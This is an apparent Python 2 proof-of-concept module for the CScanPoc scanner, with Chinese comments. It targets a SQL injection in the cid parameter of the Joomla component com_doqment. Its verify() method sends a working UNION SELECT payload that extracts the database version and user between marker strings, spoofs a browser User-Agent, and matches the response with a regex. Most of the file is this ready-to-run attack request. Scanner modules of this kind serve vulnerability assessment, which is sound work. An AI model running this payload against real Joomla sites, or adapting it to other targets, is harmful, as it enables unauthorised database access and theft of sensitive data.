# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    poc_id = '85c300e9-70ee-463c-8903-d984d3f89376'
    name = 'Joomla Component com_doqment (cid) SQL Injection Vulnerability' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-07-01'  # 漏洞公布时间
    desc = '''
        Joomla Component com_doqment的参数cid过滤不严格，导致出现SQL注入漏洞。
        远程攻击者可以利用该漏洞执行任意SQL指令，获取敏感信息。
    ''' # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-67389' # 
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Joomla!'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'ff986bde-1f72-49b7-b802-389935b7223d' # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            #利用的payload
            payload="-11/**/union/**/select/**/1,2,concat(0x247e7e7e24,version(),0x2a2a2a,user(),0x247e7e7e24),4,5,6,7,8--"
            #漏洞地址
            exploit='/index.php?option=com_doqment&cid='
            #构造访问地址
            vulurl=arg+exploit+payload
            #自定义的HTTP头
            httphead = {
            'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Connection':'keep-alive'
            }

            #正则表达式
            par="\$~~~\$([0-9a-zA-Z_].*)\*\*\*([0-9a-zA-Z_].*)\$~~~\$"
            #访问
            resp=requests.get(url=vulurl,headers=httphead,timeout=50)
            #检查是否有特殊字符串
            if '$~~~$' in resp.content:
                match=re.search(par,resp.content,re.I|re.M)
                if match:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
            
        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()